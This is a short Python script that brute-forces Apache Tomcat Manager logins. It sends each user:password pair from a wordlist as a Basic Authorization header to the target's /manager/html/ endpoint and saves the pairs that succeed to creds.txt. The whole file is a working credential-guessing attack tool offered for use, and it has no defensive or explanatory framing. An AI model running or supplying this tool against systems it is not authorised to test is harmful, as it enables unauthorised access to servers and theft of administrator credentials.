import requests
import time
import base64

def encode(i):
    encoded = i.encode("ascii")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("ascii")
    encoded = "Basic " + encoded

    return encoded

def scanner(url,file):
    url = url + "/manager/html/"
    l = open(file,'r')
    
    win = open("creds.txt","w")
    win.close()

    for i in l:
        i = i.strip()
        encoded = encode(i)
        
        header = {"Authorization": encoded}
        r = requests.get(url,headers=header)
    
        if r.status_code == 200:
            print("Founds Credentials: ",i)
            win = open("creds.txt","a")
            win.write(i)
            win.write("\n")
            time.sleep(1)
        else:
            print("Credentials: " + i + " are wrong!")
            continue

    l.close()
    win.close()
    
    print("Done! Check your creds.txt for any passwords found!")
    exit()

def file_load(url):
    print("Enter file name. Press 0 for default list.txt")
    file = input("File name: ")
    
    if file == "0":
        file = "list.txt"
        scanner(url,file)
    else:
        scanner(url,file)
        

def main():
    print("Welcome to Tomcat user:password scanner!")
    time.sleep(1)
    while True:
        try:
            url = input("Enter url: ")
            file_load(url)

        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

main()